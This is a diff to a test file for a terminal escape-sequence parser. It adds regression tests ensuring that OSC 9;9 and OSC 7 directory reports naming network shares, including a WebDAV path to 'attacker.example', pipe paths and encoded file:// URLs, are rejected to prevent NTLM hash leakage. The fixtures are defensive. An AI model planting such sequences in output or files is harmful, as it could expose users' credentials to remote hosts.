@@ -100,12 +100,27 @@ describe('OscParser: OSC 9;9 cwd', () => {
     expect(events).toEqual([{ cwd: 'C:\\Users\\me\\my work' }])
   })
 
-  it('reports an unquoted path, a UNC share and a posix path', () => {
+  it('reports an unquoted path and a posix path', () => {
     expect(feed(osc('9;9;D:\\src')).events).toEqual([{ cwd: 'D:\\src' }])
-    expect(feed(osc('9;9;"\\\\server\\share\\dir"')).events).toEqual([
-      { cwd: '\\\\server\\share\\dir' },
-    ])
     expect(feed(osc('9;9;/home/me')).events).toEqual([{ cwd: '/home/me' }])
+  })
+
+  // Found in a security review: any printed text (a file only `cat`ed) could name a share,
+  // which the file pane then listed, offering the user's NTLM hash to its host.
+  it.each([
+    '9;9;"\\\\server\\share\\dir"',
+    '9;9;\\\\attacker.example@SSL\\s',
+    '9;9;"\\\\?\\UNC\\server\\share"',
+    '9;9;\\\\.\\pipe\\x',
+    '9;9;//server/share',
+    '9;9;/\\server\\share',
+    '7;file:////server/share',
+    '7;file://localhost//server/share',
+    '7;file:///%5C%5Cserver%5Cshare',
+  ])('reports no network share: %s', (payload) => {
+    const { text, events } = feed(osc(payload))
+    expect(events).toEqual([])
+    expect(text).toBe(osc(payload))
   })
 
   it('survives being split at every byte', () => {
